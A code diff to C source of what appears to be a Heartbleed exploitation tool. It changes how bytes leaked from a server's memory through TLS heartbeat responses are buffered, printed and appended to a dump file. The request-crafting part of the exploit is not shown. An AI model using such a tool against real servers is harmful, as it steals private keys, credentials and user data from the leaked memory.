@@ -90,7 +90,7 @@ struct DumpArgs {
     unsigned port;
     unsigned byte_count;
     BIGNUM n;
-    unsigned char buf[65536];
+    unsigned char buf[70000];
 };
 
 /****************************************************************************
@@ -126,7 +126,7 @@ dump_bytes(int write_p, int version, int content_type,
             const void *vbuf, size_t len, SSL *ssl, 
             void *arg)
 {
-    struct DumpArgs *dumpargs = (struct DumpArgs*)arg;
+    struct DumpArgs *args = (struct DumpArgs*)arg;
     const unsigned char *buf = (const unsigned char *)vbuf;
 
     /*
@@ -142,7 +142,7 @@ dump_bytes(int write_p, int version, int content_type,
         return;
     case SSL3_RT_ALERT: /* 21 */
         ERROR_MSG("[-] ALERT\n");
-        dumpargs->is_alert = 1;
+        args->is_alert = 1;
         return;
     case TLS1_RT_HEARTBEAT:
         break; /* handle below */
@@ -156,11 +156,18 @@ dump_bytes(int write_p, int version, int content_type,
      */
     DEBUG_MSG("[+] %5u-bytes bleed received\n", (unsigned)len);
 
+    /*
+     * Copy this to the buffer
+     */
+    if (len > sizeof(args->buf) - args->byte_count)
+        len = sizeof(args->buf) - args->byte_count;
+    memcpy(args->buf + args->byte_count, buf, len);
+    args->byte_count += len;
 
     /*
      * Display bytes if not dumping to file
      */
-    if (!dumpargs->fp) {
+    if (!args->fp) {
         size_t i;
     
         /* no file, so print hex dump instead */
@@ -223,6 +230,7 @@ process_bleed(struct DumpArgs *args)
     if (x != args->byte_count) {
         ERROR_MSG("[-] %s: %s\n", args->filename, strerror(errno));
     }
+    fflush(args->fp);
     args->byte_count = 0;
 }
 
@@ -248,6 +256,16 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     char port[6];
     time_t started;
     
+    /*
+     * Open the file if it exists
+     */
+    if (args->filename) {
+        args->fp = fopen(args->filename, "ab+");
+        if (args->fp == NULL) {
+            perror(args->filename);
+            return -1;
+        }
+    }
     /*
      * Format the HTTP request. We need to stick the "Host:" header in
      * the correct place in the header
@@ -559,6 +577,10 @@ end:
         SSL_CTX_free(ctx);
     if (fd != -1)
         closesocket(fd);
+    if (args->fp) {
+        fclose(args->fp);
+        args->fp = NULL;
+    }
     return 0;
 }
 
@@ -684,16 +706,7 @@ usage:
         goto usage;
     }
 
-    /*
-     * Open the file if it exists
-     */
-    if (args.filename) {
-        args.fp = fopen(args.filename, "wb");
-        if (args.fp == NULL) {
-            perror(args.filename);
-            return -1;
-        }
-    }
+    
 
     /*
      * Now run the thread
